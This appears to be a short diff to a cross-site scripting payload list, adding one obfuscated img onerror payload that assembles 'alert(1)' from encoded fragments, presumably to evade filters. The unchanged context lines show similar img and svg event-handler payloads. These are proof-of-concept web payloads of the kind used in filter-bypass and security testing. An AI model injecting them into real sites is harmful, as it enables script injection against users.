@@ -9,7 +9,7 @@ windiow
 
 <img src=1 onerror=location="javascript:alert(1)">
 <img src="1" onerror=location="javascript:aler"%2b"t%2"%2b"81%2"%2b"9">
-
+<img src=1 onerror=a="%2",location="javascript:aler"%2b"t"%2ba%2b"81"%2ba%2b"9">
 
 <svg onload="javascript:window.onerror=alert;throw 1">
 <svg onload="javascript:top.onerror=alert;throw 1">
